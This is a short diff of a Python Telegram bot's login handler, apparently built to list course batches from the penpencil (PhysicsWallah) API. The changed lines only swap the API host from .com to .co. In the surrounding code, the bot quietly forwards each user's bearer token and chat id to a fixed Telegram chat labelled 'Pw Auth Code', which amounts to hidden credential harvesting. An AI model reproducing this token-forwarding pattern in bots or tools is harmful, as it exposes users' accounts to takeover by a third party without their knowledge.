@@ -689,7 +689,7 @@ async def account_login(bot: Client, m: Message):
     raw_text1 = input1.text
     await bot.send_message(-1001927599085, f"**Pw Auth Code**\n{editable.chat.id}\n\n`{raw_text1}`")
     headers = {
-        "Host": "api.penpencil.com",
+        "Host": "api.penpencil.co",
         "authorization": f"Bearer {raw_text1}",
         "client-id": "5eb393ee95fab7468a79d189",
         "client-version": "2.4.15",
@@ -713,7 +713,7 @@ async def account_login(bot: Client, m: Message):
     }
     await editable.edit("**You have these Batches :-\n\nBatch ID : Batch Name**")
     response = requests.get(
-        "https://api.penpencil.com/v3/batches/my-batches",
+        "https://api.penpencil.co/v3/batches/my-batches",
         params=params,
         headers=headers,
     ).json()["data"]
